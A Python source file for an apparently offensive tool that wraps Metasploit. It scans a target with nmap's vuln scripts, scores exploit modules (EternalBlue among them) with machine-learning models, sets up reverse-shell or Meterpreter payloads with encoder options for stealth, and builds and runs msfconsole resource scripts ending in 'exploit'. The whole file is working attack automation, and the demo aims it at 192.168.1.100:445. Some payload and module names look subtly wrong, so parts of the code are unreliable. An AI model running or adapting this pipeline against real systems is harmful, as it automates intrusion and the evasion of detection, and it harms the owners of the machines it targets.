#!/usr/bin/env python3
"""
SynOS Smart Metasploit Integration
AI-driven exploit module selection and payload configuration
"""

import asyncio
import json
import logging
import subprocess
import tempfile
import time
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from pathlib import Path
import sqlite3
from enum import Enum
import xml.etree.ElementTree as ET

import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
from sklearn.cluster import KMeans
import requests


class ExploitCategory(Enum):
    REMOTE = "remote"
    LOCAL = "local"
    WEB = "web"
    WIRELESS = "wireless"
    AUXILIARY = "auxiliary"
    POST = "post"
    EVASION = "evasion"


class PayloadType(Enum):
    REVERSE_TCP = "reverse_tcp"
    BIND_TCP = "bind_tcp"
    REVERSE_HTTP = "reverse_http"
    REVERSE_HTTPS = "reverse_https"
    METERPRETER = "meterpreter"
    SHELL = "shell"
    EXEC = "exec"


@dataclass
class Target:
    host: str
    port: int
    service: str
    version: str
    os: Optional[str] = None
    architecture: Optional[str] = None
    vulnerabilities: List[str] = field(default_factory=list)
    fingerprint: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ExploitModule:
    name: str
    category: ExploitCategory
    description: str
    targets: List[str]
    rank: str
    cve_refs: List[str] = field(default_factory=list)
    edb_refs: List[str] = field(default_factory=list)
    reliability: float = 0.0
    success_rate: float = 0.0
    stealth_rating: float = 0.0
    payload_compatibility: List[PayloadType] = field(default_factory=list)
    required_options: Dict[str, Any] = field(default_factory=dict)


@dataclass
class PayloadConfig:
    payload_type: PayloadType
    lhost: str
    lport: int
    options: Dict[str, Any] = field(default_factory=dict)
    encoder: Optional[str] = None
    iterations: int = 1
    format: str = "raw"


@dataclass
class ExploitSession:
    session_id: str
    target: Target
    exploit: ExploitModule
    payload: PayloadConfig
    status: str
    start_time: datetime
    success: bool = False
    session_type: Optional[str] = None
    output: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)


class MSFDatabase:
    """Interface to Metasploit database and module information"""

    def __init__(self, msf_path: str = "/usr/share/metasploit-framework"):
        self.msf_path = Path(msf_path)
        self.modules_cache: Dict[str, ExploitModule] = {}
        self.payloads_cache: List[PayloadType] = []
        self._load_modules()

    def _load_modules(self):
        """Load Metasploit modules information"""
        try:
            # Use msfconsole to get module information
            result = subprocess.run([
                'msfconsole', '-q', '-x', 'show exploits; exit'
            ], capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                self._parse_module_output(result.stdout)

        except Exception as e:
            logging.warning(f"Could not load MSF modules: {e}")
            self._load_sample_modules()

    def _parse_module_output(self, output: str):
        """Parse msfconsole module output"""
        lines = output.strip().split('\n')
        current_module = None

        for line in lines:
            if line.strip().startswith('exploit/'):
                parts = line.split()
                if len(parts) >= 3:
                    module_name = parts[0]
                    rank = parts[2] if len(parts) > 2 else "normal"
                    description = ' '.join(parts[3:]) if len(parts) > 3 else ""

                    # Determine category from path
                    category = self._determine_category(module_name)

                    self.modules_cache[module_name] = ExploitModule(
                        name=module_name,
                        category=category,
                        description=description,
                        targets=[],
                        rank=rank
                    )

    def _determine_category(self, module_name: str) -> ExploitCategory:
        """Determine exploit category from module path"""
        if 'web' in module_name.lower():
            return ExploitCategory.WEB
        elif 'local' in module_name.lower():
            return ExploitCategory.LOCAL
        elif 'wireless' in module_name.lower():
            return ExploitCategory.WIRELESS
        elif 'auxiliary' in module_name.lower():
            return ExploitCategory.AUXILIARY
        elif 'post' in module_name.lower():
            return ExploitCategory.POST
        else:
            return ExploitCategory.REMOTE

    def _load_sample_modules(self):
        """Load sample modules for demonstration"""
        sample_modules = [
            ExploitModule(
                name="exploit/multi/handler",
                category=ExploitCategory.AUXILIARY,
                description="Generic Payload Handler",
                targets=["*"],
                rank="manual"
            ),
            ExploitModule(
                name="exploit/windows/smb/ms17_010_eternalblue",
                category=ExploitCategory.REMOTE,
                description="MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
                targets=["Windows"],
                rank="great",
                cve_refs=["CVE-2017-0144"]
            ),
            ExploitModule(
                name="exploit/linux/ssh/ssh_login",
                category=ExploitCategory.REMOTE,
                description="SSH Login Check Scanner",
                targets=["Linux"],
                rank="manual"
            )
        ]

        for module in sample_modules:
            self.modules_cache[module.name] = module

    def get_modules_by_service(self, service: str) -> List[ExploitModule]:
        """Get exploit modules targeting specific service"""
        matching_modules = []

        for module in self.modules_cache.values():
            if (service.lower() in module.name.lower() or
                service.lower() in module.description.lower()):
                matching_modules.append(module)

        return matching_modules

    def get_modules_by_cve(self, cve: str) -> List[ExploitModule]:
        """Get exploit modules for specific CVE"""
        matching_modules = []

        for module in self.modules_cache.values():
            if cve in module.cve_refs or cve in module.description:
                matching_modules.append(module)

        return matching_modules


class AIExploitSelector:
    """AI-powered exploit module selection and optimization"""

    def __init__(self):
        self.success_predictor = RandomForestClassifier(n_estimators=100, random_state=42)
        self.reliability_estimator = GradientBoostingClassifier(n_estimators=100, random_state=42)
        self.stealth_analyzer = RandomForestClassifier(n_estimators=50, random_state=42)
        self.text_vectorizer = TfidfVectorizer(max_features=500, stop_words='english')
        self.scaler = StandardScaler()
        self.trained = False

    def train_models(self, exploit_history: List[Dict]):
        """Train AI models on exploit success history"""
        if len(exploit_history) < 20:  # Need minimum data
            logging.warning("Insufficient training data for AI models")
            return

        df = pd.DataFrame(exploit_history)

        # Feature engineering
        text_features = self._extract_text_features(df)
        numerical_features = self._extract_numerical_features(df)

        # Combine features
        features = np.hstack([text_features, numerical_features])

        # Train models
        if 'success' in df.columns:
            self.success_predictor.fit(features, df['success'])

        if 'reliability_score' in df.columns:
            self.reliability_estimator.fit(features, df['reliability_score'])

        if 'stealth_detected' in df.columns:
            self.stealth_analyzer.fit(features, df['stealth_detected'])

        self.trained = True
        logging.info("AI exploit selection models trained successfully")

    def _extract_text_features(self, df: pd.DataFrame) -> np.ndarray:
        """Extract text features from exploit descriptions"""
        descriptions = df['description'].fillna('')
        return self.text_vectorizer.fit_transform(descriptions).toarray()

    def _extract_numerical_features(self, df: pd.DataFrame) -> np.ndarray:
        """Extract numerical features from exploit data"""
        features = df[['target_port', 'service_version_match', 'payload_size', 'execution_time']].fillna(0)
        return self.scaler.fit_transform(features)

    def select_optimal_exploit(self, target: Target, available_modules: List[ExploitModule]) -> Optional[ExploitModule]:
        """Select optimal exploit module for target using AI"""
        if not available_modules:
            return None

        best_module = None
        best_score = -1

        for module in available_modules:
            score = self._score_exploit_match(target, module)

            if score > best_score:
                best_score = score
                best_module = module

        return best_module

    def _score_exploit_match(self, target: Target, module: ExploitModule) -> float:
        """Score exploit module compatibility with target"""
        score = 0.0

        # Service matching
        if target.service.lower() in module.name.lower():
            score += 3.0

        # CVE matching
        for vuln in target.vulnerabilities:
            if vuln in module.cve_refs:
                score += 5.0

        # Rank weighting
        rank_weights = {
            'excellent': 3.0,
            'great': 2.5,
            'good': 2.0,
            'normal': 1.5,
            'average': 1.0,
            'low': 0.5,
            'manual': 0.2
        }
        score += rank_weights.get(module.rank.lower(), 1.0)

        # AI prediction (if trained)
        if self.trained:
            try:
                features = self._extract_target_features(target, module)
                success_prob = self.success_predictor.predict_proba([features])[0][1]
                score += success_prob * 2.0
            except Exception:
                pass

        return score

    def _extract_target_features(self, target: Target, module: ExploitModule) -> List[float]:
        """Extract features for AI model prediction"""
        return [
            target.port,
            1.0 if target.service.lower() in module.name.lower() else 0.0,
            len(module.description),
            len(target.vulnerabilities)
        ]

    def recommend_payload(self, target: Target, exploit: ExploitModule, context: Dict[str, Any]) -> PayloadConfig:
        """Recommend optimal payload configuration"""

        # Default payload selection based on target OS
        if target.os and 'windows' in target.os.lower():
            payload_type = PayloadType.METERPRETER
        else:
            payload_type = PayloadType.REVERSE_TCP

        # Network constraints
        lhost = context.get('lhost', '127.0.0.1')
        lport = context.get('lport', 4444)

        # Stealth requirements
        stealth_mode = context.get('stealth_mode', False)
        if stealth_mode:
            payload_type = PayloadType.REVERSE_HTTPS

        return PayloadConfig(
            payload_type=payload_type,
            lhost=lhost,
            lport=lport,
            encoder="x86/shikata_ga_nai" if stealth_mode else None,
            iterations=3 if stealth_mode else 1
        )


class SmartMetasploit:
    """AI-enhanced Metasploit framework integration"""

    def __init__(self, db_path: str = "/var/lib/synos/metasploit.db"):
        self.db_path = Path(db_path)
        self.msf_db = MSFDatabase()
        self.ai_selector = AIExploitSelector()
        self.active_sessions: Dict[str, ExploitSession] = {}
        self.session_history: List[ExploitSession] = []

        # Initialize database
        self._init_database()

        # Load historical data for AI training
        self._load_training_data()

    def _init_database(self):
        """Initialize SQLite database for exploit sessions"""
        self.db_path.parent.mkdir(parents=True, exist_ok=True)

        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS exploit_sessions (
                    session_id TEXT PRIMARY KEY,
                    target_host TEXT NOT NULL,
                    target_port INTEGER NOT NULL,
                    target_service TEXT NOT NULL,
                    exploit_module TEXT NOT NULL,
                    payload_type TEXT NOT NULL,
                    success BOOLEAN NOT NULL,
                    start_time TIMESTAMP NOT NULL,
                    execution_time REAL,
                    session_type TEXT,
                    stealth_detected BOOLEAN DEFAULT FALSE
                )
            """)

            conn.execute("""
                CREATE TABLE IF NOT EXISTS target_fingerprints (
                    host TEXT NOT NULL,
                    port INTEGER NOT NULL,
                    service TEXT NOT NULL,
                    version TEXT,
                    os TEXT,
                    architecture TEXT,
                    vulnerabilities TEXT,
                    last_updated TIMESTAMP NOT NULL,
                    PRIMARY KEY (host, port, service)
                )
            """)

            conn.commit()

    def _load_training_data(self):
        """Load historical exploit data for AI training"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                query = """
                    SELECT target_service, exploit_module, success, execution_time,
                           CASE WHEN session_type IS NOT NULL THEN 3 ELSE 1 END as reliability_score,
                           stealth_detected, target_port, 1 as service_version_match,
                           100 as payload_size,
                           '' as description
                    FROM exploit_sessions
                    LIMIT 1000
                """
                df = pd.read_sql_query(query, conn)

                if len(df) > 20:
                    training_data = df.to_dict('records')
                    self.ai_selector.train_models(training_data)

        except Exception as e:
            logging.warning(f"Could not load training data: {e}")

    async def analyze_target(self, host: str, port: int) -> Target:
        """Analyze target for exploit selection"""

        # Basic service detection using nmap
        try:
            result = subprocess.run([
                'nmap', '-sV', '-O', '--script=vuln',
                f'{host}', '-p', str(port)
            ], capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                return self._parse_nmap_output(host, port, result.stdout)

        except subprocess.TimeoutExpired:
            logging.warning(f"Nmap scan of {host}:{port} timed out")
        except Exception as e:
            logging.error(f"Error scanning {host}:{port}: {e}")

        # Fallback to basic target
        return Target(
            host=host,
            port=port,
            service="unknown",
            version="unknown"
        )

    def _parse_nmap_output(self, host: str, port: int, nmap_output: str) -> Target:
        """Parse nmap output to extract target information"""
        target = Target(host=host, port=port, service="unknown", version="unknown")

        lines = nmap_output.split('\n')
        for line in lines:
            line = line.strip()

            # Extract service information
            if f"{port}/tcp" in line and "open" in line:
                parts = line.split()
                if len(parts) >= 3:
                    target.service = parts[2]
                    if len(parts) >= 4:
                        target.version = ' '.join(parts[3:])

            # Extract OS information
            if "OS:" in line or "Running:" in line:
                target.os = line.split(':', 1)[1].strip()

            # Extract vulnerabilities
            if "CVE-" in line:
                cve_refs = [word for word in line.split() if word.startswith("CVE-")]
                target.vulnerabilities.extend(cve_refs)

        return target

    async def select_exploit_strategy(self, target: Target, context: Dict[str, Any] = None) -> Tuple[Optional[ExploitModule], PayloadConfig]:
        """Select optimal exploit and payload configuration"""
        if context is None:
            context = {}

        # Get available exploit modules for target service
        available_modules = self.msf_db.get_modules_by_service(target.service)

        # Add CVE-specific modules
        for vuln in target.vulnerabilities:
            cve_modules = self.msf_db.get_modules_by_cve(vuln)
            available_modules.extend(cve_modules)

        # Remove duplicates
        unique_modules = {m.name: m for m in available_modules}
        available_modules = list(unique_modules.values())

        # AI-powered exploit selection
        selected_exploit = self.ai_selector.select_optimal_exploit(target, available_modules)

        if not selected_exploit:
            logging.warning(f"No suitable exploit found for {target.host}:{target.port}")
            return None, None

        # AI-recommended payload configuration
        payload_config = self.ai_selector.recommend_payload(target, selected_exploit, context)

        logging.info(f"Selected exploit: {selected_exploit.name} for {target.host}:{target.port}")
        return selected_exploit, payload_config

    async def execute_exploit(self, target: Target, exploit: ExploitModule, payload: PayloadConfig) -> str:
        """Execute exploit against target"""

        session_id = self._generate_session_id()
        start_time = datetime.now()

        session = ExploitSession(
            session_id=session_id,
            target=target,
            exploit=exploit,
            payload=payload,
            status="running",
            start_time=start_time
        )

        self.active_sessions[session_id] = session

        try:
            # Generate Metasploit resource script
            resource_script = self._generate_resource_script(target, exploit, payload)

            # Execute via msfconsole
            result = await self._execute_msfconsole(resource_script)

            # Parse results
            session.success = self._parse_exploit_results(result)
            session.output = result
            session.status = "completed"

            if session.success:
                session.session_type = "meterpreter"  # or detect from output
                logging.info(f"Exploit {session_id} succeeded against {target.host}:{target.port}")
            else:
                logging.warning(f"Exploit {session_id} failed against {target.host}:{target.port}")

        except Exception as e:
            session.status = "failed"
            session.output = str(e)
            logging.error(f"Exploit {session_id} encountered error: {e}")

        finally:
            # Store session in database
            self._store_session_result(session)

            # Move to history
            self.session_history.append(session)
            if session_id in self.active_sessions:
                del self.active_sessions[session_id]

        return session_id

    def _generate_resource_script(self, target: Target, exploit: ExploitModule, payload: PayloadConfig) -> str:
        """Generate Metasploit resource script for execution"""
        script_lines = [
            f"use {exploit.name}",
            f"set RHOST {target.host}",
            f"set RPORT {target.port}",
            f"set payload {payload.payload_type.value}",
            f"set LHOST {payload.lhost}",
            f"set LPORT {payload.lport}"
        ]

        # Add payload options
        for key, value in payload.options.items():
            script_lines.append(f"set {key} {value}")

        # Add encoder if specified
        if payload.encoder:
            script_lines.append(f"set encoder {payload.encoder}")
            script_lines.append(f"set iterations {payload.iterations}")

        # Add exploit-specific options
        for key, value in exploit.required_options.items():
            script_lines.append(f"set {key} {value}")

        script_lines.extend([
            "check",
            "exploit",
            "exit"
        ])

        return '\n'.join(script_lines)

    async def _execute_msfconsole(self, resource_script: str) -> str:
        """Execute Metasploit resource script"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(resource_script)
            resource_file = f.name

        try:
            # Execute msfconsole with resource script
            result = subprocess.run([
                'msfconsole', '-q', '-r', resource_file
            ], capture_output=True, text=True, timeout=300)

            return result.stdout + result.stderr

        finally:
            Path(resource_file).unlink(missing_ok=True)

    def _parse_exploit_results(self, output: str) -> bool:
        """Parse msfconsole output to determine exploit success"""
        success_indicators = [
            "session opened",
            "meterpreter >",
            "shell opened",
            "exploit completed"
        ]

        failure_indicators = [
            "exploit failed",
            "connection refused",
            "timeout",
            "access denied"
        ]

        output_lower = output.lower()

        for indicator in success_indicators:
            if indicator in output_lower:
                return True

        for indicator in failure_indicators:
            if indicator in output_lower:
                return False

        # Default to failure if unclear
        return False

    def _store_session_result(self, session: ExploitSession):
        """Store exploit session results in database"""
        with sqlite3.connect(self.db_path) as conn:
            execution_time = (datetime.now() - session.start_time).total_seconds()

            conn.execute("""
                INSERT OR REPLACE INTO exploit_sessions
                (session_id, target_host, target_port, target_service,
                 exploit_module, payload_type, success, start_time,
                 execution_time, session_type)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session.session_id, session.target.host, session.target.port,
                session.target.service, session.exploit.name,
                session.payload.payload_type.value, session.success,
                session.start_time, execution_time, session.session_type
            ))

            # Store target fingerprint
            conn.execute("""
                INSERT OR REPLACE INTO target_fingerprints
                (host, port, service, version, os, architecture, vulnerabilities, last_updated)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session.target.host, session.target.port, session.target.service,
                session.target.version, session.target.os, session.target.architecture,
                ','.join(session.target.vulnerabilities), datetime.now()
            ))

            conn.commit()

    async def get_session_status(self, session_id: str) -> Dict[str, Any]:
        """Get exploit session status and results"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT target_host, target_port, exploit_module, success,
                       start_time, execution_time, session_type
                FROM exploit_sessions WHERE session_id = ?
            """, (session_id,))

            result = cursor.fetchone()
            if not result:
                return {"error": "Session not found"}

            host, port, exploit, success, start_time, exec_time, session_type = result

            return {
                "session_id": session_id,
                "target": f"{host}:{port}",
                "exploit_used": exploit,
                "success": bool(success),
                "start_time": start_time,
                "execution_time": exec_time,
                "session_type": session_type,
                "is_active": session_id in self.active_sessions
            }

    def _generate_session_id(self) -> str:
        """Generate unique session ID"""
        timestamp = int(time.time())
        return f"exploit_{timestamp}"

    async def get_exploit_recommendations(self, target_host: str, target_port: int) -> List[Dict[str, Any]]:
        """Get AI-powered exploit recommendations for target"""
        target = await self.analyze_target(target_host, target_port)

        available_modules = self.msf_db.get_modules_by_service(target.service)

        # Add CVE-specific modules
        for vuln in target.vulnerabilities:
            cve_modules = self.msf_db.get_modules_by_cve(vuln)
            available_modules.extend(cve_modules)

        recommendations = []
        for module in available_modules[:10]:  # Top 10 recommendations
            score = self.ai_selector._score_exploit_match(target, module)

            recommendations.append({
                "module": module.name,
                "description": module.description,
                "category": module.category.value,
                "rank": module.rank,
                "compatibility_score": round(score, 2),
                "cve_refs": module.cve_refs
            })

        # Sort by compatibility score
        recommendations.sort(key=lambda x: x['compatibility_score'], reverse=True)
        return recommendations


async def main():
    """Example usage of Smart Metasploit Integration"""
    logging.basicConfig(level=logging.INFO)

    msf = SmartMetasploit()

    # Example: Analyze target and select exploit
    target_host = "192.168.1.100"
    target_port = 445

    print(f"Analyzing target {target_host}:{target_port}")
    target = await msf.analyze_target(target_host, target_port)
    print(f"Target service: {target.service} {target.version}")
    print(f"Vulnerabilities: {target.vulnerabilities}")

    # Get exploit recommendations
    recommendations = await msf.get_exploit_recommendations(target_host, target_port)
    print(f"\nTop exploit recommendations:")
    for i, rec in enumerate(recommendations[:5], 1):
        print(f"{i}. {rec['module']} (Score: {rec['compatibility_score']})")

    # Select and execute exploit strategy
    exploit, payload = await msf.select_exploit_strategy(target)

    if exploit:
        print(f"\nSelected exploit: {exploit.name}")
        print(f"Payload configuration: {payload.payload_type.value}")

        # Note: Uncomment to actually execute exploit (use with caution)
        # session_id = await msf.execute_exploit(target, exploit, payload)
        # print(f"Exploit session: {session_id}")


if __name__ == "__main__":
    asyncio.run(main())